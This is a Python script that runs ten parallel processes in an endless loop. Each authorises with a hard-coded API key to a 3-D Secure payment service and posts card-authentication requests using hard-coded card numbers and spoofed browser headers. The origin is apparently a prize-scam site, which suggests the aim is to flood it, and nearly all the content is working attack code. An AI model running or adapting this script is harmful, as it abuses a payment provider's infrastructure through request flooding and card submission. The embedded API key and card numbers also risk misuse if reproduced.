#!/usr/bin/env python
# All who sin apart from the law will also perish apart from the law,
# and all who sin under the law will be judged by the law.
# Romans 2:12
from multiprocessing import Process
from requests import post
from time import sleep

def requests():
	do_auth = True
	while True:
		AUTHORIZE_URL = "https://api.3dsintegrator.com/v2/authorize"
		REQUEST_URL = "https://api.3dsintegrator.com/v2/authenticate/browser"
		AMEX = "376679044357470"
		MASTERCARD = "5165531056143880"

		auth_header = { # Working
			"authority": "api.3dsintegrator.com",
			"method": "POST",
			"path": "/v2/authorize",
			"scheme": "https",
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-US,en;q=0.9",
			"content-length": "0",
			"content-type": "application/json",
			"dnt": "1",
			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"",
			"sec-ch-ua-mobile": "?0",
			"sec-ch-ua-platform": "\"Windows\"",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "cross-site",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
			"x-3ds-api-key": "52343fe01e99f26eab489969b9718c20",
			"x-3ds-sdk-version": "2.1.0.20210929"
		}

		auth_data = { # Working
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-US,en;q=0.9",
			"content-length": "0",
			"content-type": "application/json",
			"dnt": "1",
			"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
			"sec-ch-ua-mobile": "?0",
			"sec-ch-ua-platform": '"Windows"',
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "cross-site",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
			"x-3ds-api-key": "52343fe01e99f26eab489969b9718c20",
			"x-3ds-sdk-version": "2.1.0.20210929",
		}
		if do_auth:
			authentication = post(AUTHORIZE_URL, headers=auth_header)
			authorization = authentication.headers["Authorization"]
			do_auth = False
			# print(authorization)

		card_header = { # Working
			"authority": "api.3dsintegrator.com",
			"method": "POST",
			"path": "/v2/authenticate/browser",
			"scheme": "https",
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-US,en;q=0.9",
			"authorization": authorization,
			"content-length": "612",
			"content-type": "application/json",
			"dnt": "1",
			"origin": "https://ipad1.bigbangprizes.com",
			"referer": "https://ipad1.bigbangprizes.com/",
			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"",
			"sec-ch-ua-mobile": "?0",
			"sec-ch-ua-platform": "\"Windows\"",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "cross-site",
			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
			"x-3ds-api-key": "52343fe01e99f26eab489969b9718c20",
			"x-3ds-sdk-version": "2.1.0.20210929"
		}

		card_data = { # Working
			"pan": MASTERCARD,
			"amount": 3.37,
			"month": "03",
			"year": "27",
			"protocolVersion": "2.1.0",
			"messageCategory": "01",
			"browser": {
				"browserAcceptHeader": "application/json",
				"browserJavaEnabled": "false",
				"browserJavascriptEnabled": "true",
				"browserLanguage": "en-US",
				"browserColorDepth": "24",
				"browserScreenWidth": "1920",
				"browserScreenHeight": "1080",
				"browserTZ": "240",
				"browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
			},
			"challengeIndicator": "02",
			"challengeWindowSize": "01",
			"threeDSRequestorURL": "http://paay.co",
			"transactionForcedTimeout": "20"
		}

		transaction = post(REQUEST_URL, headers=card_header, json=card_data)
		print(transaction.text, transaction.status_code)
		if transaction.status_code != 400:
			do_auth = True
		sleep(1)

def main():
	workers = []
	for i in range(10):
		workers.append(Process(target=requests))
	for worker in workers:
		worker.start()
	for worker in workers:
		worker.join()

if __name__ == "__main__":
	main()